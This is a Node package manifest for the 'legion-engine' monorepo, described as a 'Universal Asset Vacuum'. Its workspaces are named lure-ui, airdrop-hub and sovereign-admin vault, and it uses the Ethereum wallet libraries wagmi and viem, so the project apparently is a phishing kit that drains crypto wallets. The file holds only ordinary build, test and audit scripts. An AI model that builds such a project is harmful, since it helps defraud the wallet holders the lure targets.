{
  "name": "legion-engine",
  "version": "0.1.0",
  "private": true,
  "description": "Universal Asset Vacuum — multi-sentinel, API-first, frontend-agnostic backend",
  "engines": {
    "node": ">=20.0.0",
    "pnpm": ">=9.0.0"
  },
  "packageManager": "pnpm@9.15.9",
  "scripts": {
    "dev": "node scripts/dev.js",
    "dev:lure": "pnpm --filter @legion/lure-ui dev",
    "dev:hub": "pnpm --filter @legion/airdrop-hub dev",
    "dev:vault": "pnpm --filter @legion/sovereign-admin dev",
    "build:clean": "node scripts/clean-pnpm-locks.mjs",
    "build:workspace": "pnpm -r --sort --workspace-concurrency=1 --filter \"./packages/*\" build && pnpm -r --sort --workspace-concurrency=1 --filter \"./apps/*\" build",
    "build": "pnpm --filter @legion/core build && pnpm --filter @legion/api build",
    "build:all": "pnpm run build:clean && pnpm --filter @legion/core build && pnpm -r --sort --workspace-concurrency=1 --filter \"./packages/*\" --filter \"!@legion/core\" build && pnpm -r --sort --workspace-concurrency=1 --filter \"./apps/*\" build",
    "lint": "eslint . --ext .ts,.tsx",
    "typecheck": "tsc --noEmit",
    "test": "vitest run",
    "db:migrate": "pnpm --filter @legion/core db:migrate",
    "db:generate": "pnpm --filter @legion/core db:generate",
    "omni-audit": "tsx scripts/omni-audit.ts",
    "final-audit": "tsx scripts/final-audit-report.ts",
    "health": "node --env-file=.env --env-file=.env.development --import tsx scripts/health-check.ts",
    "build:check": "pnpm -r exec tsc --noEmit --skipLibCheck false > compiler-errors.txt 2>&1"
  },
  "devDependencies": {
    "@legion/core": "workspace:*",
    "@types/node": "^20.0.0",
    "@types/pg": "^8.20.0",
    "bullmq": "^5.34.5",
    "ioredis": "^5.4.1",
    "pg": "^8.20.0",
    "tsx": "^4.21.0",
    "typescript": "^5.4.0",
    "eslint": "^8.57.0",
    "vitest": "^1.6.0",
    "prettier": "^3.3.0"
  },
  "pnpm": {
    "overrides": {
      "wagmi": "2.12.0",
      "viem": "2.21.0",
      "@wagmi/core": "2.13.0",
      "@wagmi/connectors": "5.1.0"
    }
  }
}
